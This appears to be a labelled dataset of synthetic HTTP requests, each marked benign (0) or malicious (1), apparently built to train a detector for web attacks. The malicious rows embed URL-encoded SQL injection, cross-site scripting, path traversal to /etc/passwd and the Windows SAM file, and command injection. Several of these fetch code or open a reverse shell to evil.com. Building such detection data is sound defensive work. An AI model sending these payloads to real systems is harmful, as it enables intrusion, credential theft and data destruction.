DELETE /docs/api?age=system+log+entry&title=560 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /images/logo.png?password=my+address+is&lang=629&order_id=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd&price_min=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /docs/api?token=my%20admin%27/%2A%20you&date=724&tags=169&view=471 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /settings?search=my%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/search action=299&city=945&rating=324&content=688&category=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /dashboard?last_name=%27%20AND%20%27x%27%3D%27x&color=hello+world&id=685&first_name=191 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/v1/data city=I+would+like+to+order&price_max=this+is+a+normal+comment&filters=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /products/123?color=%7C%20curl%20http%3A//evil.com/backdoor&token=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /settings?view=contact+me+at+email@example.com&columns=22&password=please%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20comment&order=646 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /users/456?content=John+Doe&filter=174&id=820 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /login?order=thank+you&new_password=123+Main+St&search_term=833&token=best%20%27%3B%20DROP%20TABLE%20users--%20comment&region=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /docs/api?region=763&token=contact+me+at+email@example.com&age=thank%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /contact?quantity=thank%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20email%40example.com&price_max=I+would+like+to+order&q=782 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /api/reports?type=../../../etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /images/logo.png product_id=592&type=I+would+like+to+order&username=481&tracking=325 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /settings?session=test%20%27%20OR%201%3D1--%20comment&phone=123+Main+St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /posts/789?id=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /dashboard rating=contact+me+at+email@example.com&search=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&first_name=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /help/faq last_name=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&content=906&product_id=582&comment=172&name=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/search?comment=test+user&rating=this+is+a+normal+comment&old_password=admin+access+request&columns=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /js/app.js sort=920&region=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/orders?category=thank+you&page=system+log+entry&tags=797&old_password=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /contact?id=John+Doe&filter=807&order_id=admin+access+request&quantity=hello%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20comment&type=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /contact?content=433&sort=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/orders status=119&tags=665&id=557&comment=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /css/style.css q=123+Main+St&action=346&rating=898&color=514 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /css/style.css q=123+Main+St&username=188&city=403&age=test+user&limit=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /api/v2/analytics?limit=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /docs/api?limit=thank%20%27%20AND%201%3D1--%20request&last_name=154&order_id=thank+you&lang=652&user_id=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /profile old_password=this+is+a+normal+comment&filter=John%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20attached&first_name=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?last_name=I+would+like+to+order&password=contact+me+at+email@example.com&price_max=262&filter=57 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /register type=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /dashboard tag=29&filters=104&title=7&q=500 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /docs/api?search=310&phone=hello+world&old_password=test+user&email=285&format=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /register?format=407&old_password=../../../etc/passwd&author=John+Doe&content=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /docs/api?action=380 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /settings?author=test%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /register title=357&order=my%20/var/www/../../etc/passwd%20St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /profile user_id=807&action=838&region=629&new_password=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/products region=633&search_term=117&product_id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&tag=this+is+a+normal+comment&user_id=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /help/faq?lang=my+address+is&email=system+log+entry&phone=11&view=624&color=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/reports id=this+is+a+normal+comment&lang=123%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20world&action=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /images/logo.png product_id=%26%20whoami User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /docs/api?password=I+would+like+to+order&tags=please+find+attached&search_term=408&lang=255&q=199 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /profile search=46&page=I+would+like+to+order&quantity=admin+access+request&session=%26%20nc%20-e%20/bin/bash%20evil.com%204444 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /docs/api password=admin%27%20OR%20%271%27%3D%271&lang=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /docs/api view=809&password=John%20..%25252f..%25252f..%25252fetc%25252fpasswd%20entry&sort=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard limit=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /about search_term=518&tag=793&token=my%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /dashboard?color=123+Main+St&category=test%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20regards&id=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?limit=622&type=my+address+is&lang=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&token=my+address+is&region=779 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /register price_min=214&region=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /api/products?last_name=this+is+a+normal+comment&columns=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/search content=57&city=467&user_id=172 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /settings category=test%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20attached&username=903 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/users session=306&first_name=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&color=system+log+entry&product_id=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard columns=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/search?last_name=545&product_id=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /settings user_id=845&new_password=system%20%27%20AND%201%3D1--%20comment&columns=846&product_id=thank+you&view=399 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/orders?limit=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /docs/api?order=please+find+attached&date=237&filters=434&filter=my+address+is&limit=/var/www/../../etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /dashboard columns=this%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20attached&limit=324 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/reports?action=hello+world&category=742&page=720&price_min=721&filters=788 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/v2/analytics?comment=please%20../../../etc/passwd%20regards&filters=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /css/style.css filters=870&price_max=admin+access+request&name=861&phone=admin%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /dashboard?tags=833&category=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /register email=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /contact?first_name=123+Main+St&content=278&region=hello+world&name=thank+you&view=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /about?search=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--&price_max=I+would+like+to+order&session=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /contact limit=admin+access+request&author=test+user&order=John+Doe&first_name=320&tracking=31 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /login?filter=hello+world&action=116 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /help/faq?color=hello+world&first_name=123+Main+St&view=my+address+is&city=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/v2/analytics?filters=664&password=817&title=thank+you&user_id=321 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /products/123?last_name=thank%20%3Bcat%24%7BIFS%7D/etc/passwd%20is&age=554 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/search?sort=502&region=123+Main+St&city=test%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /docs/api?filters=135&title=John%20%7C%20cat%20/etc/passwd%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/v1/data last_name=360&color=test+user&new_password=696&phone=best%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20world&content=784 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/products token=123+Main+St&color=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&new_password=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /js/app.js product_id=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /register?page=123%20%27%20AND%201%3D1--%20comment&date=admin+access+request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /about?search=system%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20email%40example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/search q=contact+me+at+email@example.com&name=777 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/orders?sort=contact+me+at+email@example.com&price_min=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&city=791&username=I+would+like+to+order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/users comment=124&author=474&city=%3B%20ls%20-la&session=hello+world&id=431 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/reports?format=527 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/products price_min=446&filters=thank+you&new_password=system+log+entry&order_id=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/search?action=362&type=50&age=793&quantity=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /about?username=../../../etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /docs/api?type=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&token=889 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /docs/api?title=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&tags=123+Main+St&id=631&author=please+find+attached&tag=2 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /contact?limit=please%20admin%27--%20order&username=260&new_password=I+would+like+to+order&lang=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /posts/789 action=102&email=this+is+a+normal+comment&format=79 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /docs/api?author=252&category=please%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20St&id=178 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /docs/api?format=my+address+is&order=29&phone=John+Doe&region=thank+you&limit=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/users?old_password=232&quantity=hello+world&page=4 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /users/456?city=I+would+like+to+order&phone=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/reports new_password=778&view=system+log+entry&price_min=345&old_password=942&id=469 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /posts/789?id=224&date=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /about?search_term=%7C%20cat%20/etc/passwd&username=best+regards&order=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /posts/789?lang=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&tag=783&filter=633 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /settings tags=488&price_max=please+find+attached&city=this%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20user&order_id=admin+access+request&product_id=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/orders type=best%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?order_id=John+Doe&tags=my+address+is&price_min=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /help/faq quantity=774 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/products user_id=667&search=198&last_name=938&tags=671&order=994 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/v2/analytics price_max=best+regards&tag=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /api/users search_term=%3B%20ls%20-la User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /css/style.css content=16&tags=this+is+a+normal+comment&age=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /docs/api?session=832&comment=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/reports view=748&city=847&limit=876&new_password=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/v1/data?product_id=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /help/faq title=123+Main+St&username=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css tags=I+would+like+to+order&page=982&old_password=431&content=123+Main+St&city=544 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /about?region=202&rating=50&filter=559&title=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /about?email=system%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20regards&action=796 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /dashboard?date=621&first_name=743&format=John+Doe&product_id=my%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20St&tracking=535 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /css/style.css?view=admin+access+request&columns=system+log+entry&old_password=403&product_id=I%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/products?type=490&format=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&quantity=565&action=364 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/users?order=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/search?old_password=thank+you&format=498&page=test+user&user_id=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /posts/789?quantity=%3Csvg%20onload%3Dalert%281%29%3E&q=171 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /docs/api?first_name=please+find+attached&format=test+user&tag=188&date=200&user_id=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics city=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/users?columns=this%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /settings id=thank+you&product_id=John+Doe&sort=26&price_min=thank+you&page=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /api/orders?page=please+find+attached&username=test+user&rating=123+Main+St&password=990&price_min=838 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/orders?columns=123%20%7Cc%27a%27t%20/etc/passwd%20world&age=949&comment=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /profile?category=this+is+a+normal+comment&page=913&phone=%3B%20wget%20http%3A//evil.com/shell.sh&user_id=123+Main+St&last_name=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /products/123 session=John+Doe&rating=my%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20user&price_max=843&new_password=239 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /register search_term=I%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20world&q=260&name=813 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /css/style.css?tag=399&tags=please%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20request&title=432&product_id=805 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/users first_name=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /login?order_id=admin%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20regards User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /js/app.js price_min=296&filters=873&password=%27%20AND%20%27x%27%3D%27y User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /profile type=542&page=admin+access+request&quantity=this+is+a+normal+comment&content=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /profile rating=924&content=969 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /profile new_password=581&session=hello+world&filter=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/orders?username=best+regards&content=please%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20request&new_password=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /products/123 content=this%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/search?token=867&id=%60id%60 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /dashboard search_term=hello+world&session=601 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /images/logo.png?author=123+Main+St&tag=595&user_id=%27%20AND%201%3D2--&limit=this+is+a+normal+comment&last_name=347 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /api/reports old_password=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /about comment=315&age=572&first_name=my+address+is&action=please+find+attached&session=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /api/products tags=379&id=671&product_id=best+regards&user_id=927 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /dashboard?title=my+address+is&category=admin+access+request&color=admin+access+request&rating=%7C%20cat%20/etc/passwd&type=354 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /posts/789?sort=88&password=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /about?username=my%20admin%27/%2A%20order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/reports?password=admin%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/users?id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /api/v1/data status=476&order_id=please+find+attached&sort=contact%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20world&user_id=359&format=352 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /posts/789?phone=639&author=578&action=670&columns=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?status=59&limit=356&search=admin+access+request&q=test%20%7C%20curl%20http%3A//evil.com/backdoor%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /about?order=contact+me+at+email@example.com&last_name=463&username=John+Doe&price_min=my%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /about?sort=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--&new_password=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/reports?new_password=contact%20%27%20AND%201%3D2--%20St&author=986&search_term=303 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
